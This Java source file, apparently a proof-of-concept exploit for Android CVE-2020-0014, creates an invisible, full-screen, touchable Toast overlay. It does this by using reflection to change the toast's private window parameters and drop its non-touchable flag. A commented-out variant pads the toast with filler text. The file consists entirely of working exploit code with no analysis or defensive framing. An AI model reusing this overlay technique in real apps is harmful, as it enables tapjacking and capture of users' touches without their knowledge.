package com.example.cve_2020_0014_toast;

import android.content.Context;
import android.view.Gravity;
import android.view.WindowManager;
import android.widget.TextView;
import android.widget.Toast;

import java.lang.reflect.Field;

public class ClickToast {
    public static void showToast(final Context context, int duration) {
        Toast mToast = null;
        if (mToast == null) {
            MyTextView view = new MyTextView(context);
            view.setText("nothing");
            view.setAlpha(0);
            mToast = Toast.makeText(context.getApplicationContext(), "", duration);
            mToast.setGravity(Gravity.TOP, 0, 0);
            mToast.setView(view);
//            MyTextView myview=new MyTextView(context);
//            myview.setText("nothing");
//            String str ="~~~~~~";
//
//            mToast = Toast.makeText(context, new String(new char[350]).replace("\0",str),duration);
//            mToast.setGravity(Gravity.TOP|Gravity.FILL_HORIZONTAL,0,0);
//            mToast.setView(myview);
        }

        try {
            Object mTN;
            mTN = getField(mToast, "mTN");        // Toast.mTN
            if (mTN != null) {
                Object mParams = getField(mTN, "mParams");    // TN.mParams
                if (mParams != null && mParams instanceof WindowManager.LayoutParams) {
                    WindowManager.LayoutParams params = (WindowManager.LayoutParams) mParams;
                    //去掉FLAG_NOT_TOUCHABLE 使Toast可点击
                    params.flags = WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON | WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE ;
                    params.width = WindowManager.LayoutParams.MATCH_PARENT;
                    params.height = WindowManager.LayoutParams.MATCH_PARENT;
                }
            }
        } catch (Exception e) {
            e.printStackTrace();
        }

        mToast.show();

    }
    private static Object getField(Object object, String fieldName) throws NoSuchFieldException, IllegalAccessException {
        Field field = object.getClass().getDeclaredField(fieldName);
        if (field != null) {
            field.setAccessible(true);
            return field.get(object);
        }
        return null;
    }
}
